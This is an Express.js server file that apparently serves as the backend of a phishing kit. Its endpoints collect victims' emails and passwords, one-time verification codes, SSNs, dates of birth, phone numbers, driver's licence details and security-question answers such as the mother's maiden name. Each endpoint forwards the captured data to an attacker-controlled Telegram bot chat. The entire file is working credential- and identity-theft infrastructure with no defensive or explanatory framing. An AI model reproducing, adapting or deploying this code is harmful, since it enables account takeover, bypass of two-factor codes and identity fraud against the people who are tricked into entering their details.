import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());




app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.send('Backend is running');
});



app.post('/sendToTelegram', async (req, res) => {
  const { email, password } = req.body;

  console.log("Received data:", req.body);
  if (!email || !password) {
    return res.status(400).send("Missing required fields");
  }

  const message = `Email: ${email}\nPassword: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message,
      text: `New login: Email: ${email}, Time: ${new Date().toISOString()}`,
    });
    console.log('Telegram Token:', process.env.TELEGRAM_TOKEN?.slice(0,10) + '...');
    console.log('Chat ID:', process.env.CHAT_ID);

    res.status(200).send("Message sent to Telegram");
  } catch (error) {
    if (error.response) {
      console.error('Telegram API error:', error.response.data);
    } else {
      console.error('Error:', error.message);
    }
   res.status(500).json({ success: false, error: 'Failed to send to Telegram' });
  }
});

app.post('/verifyCode', async (req, res) => {
  const { code } = req.body;

  console.log("Received code:", code);

  if (!code) {
    return res.status(400).json({ success: false, message: "Code is required" });
  }

  const message = `User submitted code: ${code}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true, message: "Code sent to Telegram successfully!" });
  } catch (error) {
    if (error.response) {
      console.error('Telegram API error:', error.response.data);
    } else {
      console.error('Error:', error.message);
    }
    res.status(500).json({ success: false, message: "Error sending code to Telegram" });
  }
});
app.post('/sendDetails', async (req, res) => {
  const { name, dob, ssn, phone } = req.body;

  if (!name || !dob || !ssn || !phone) {
    return res.status(400).send("Missing required fields");
  }

  const message = `New user details:\nName: ${name}\nDOB: ${dob}\nSSN: ${ssn}\nPhone: ${phone}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message,
    });
    res.status(200).send("Message sent to Telegram");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending message to Telegram");
  }
});

app.post('/sendVerify', async (req, res) => {
  const { licenseNumber, issueDate, expireDate } = req.body;

  if (!licenseNumber || !issueDate || !expireDate) {
    return res.status(400).send("Missing required fields");
  }

  const message = `New user details:\nLicense: ${licenseNumber}\nIssueDate: ${issueDate}\nExpireDate: ${expireDate}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message,
    });
    res.status(200).send("Message sent to Telegram");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending message to Telegram");
  }
});

app.post('/sendPersonal', async (req, res) => {
  const { father, mother, mothers, place } = req.body;

  if (!father || !mother || !mothers || !place) {
    return res.status(400).send("Missing required fields");
  }

  const message = `New user details:\nFather: ${father}\nMother: ${mother}\nMothers: ${mothers}\nPlace: ${place}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message,
    });
    res.status(200).send("Message sent to Telegram");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending message to Telegram");
  }
});




app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
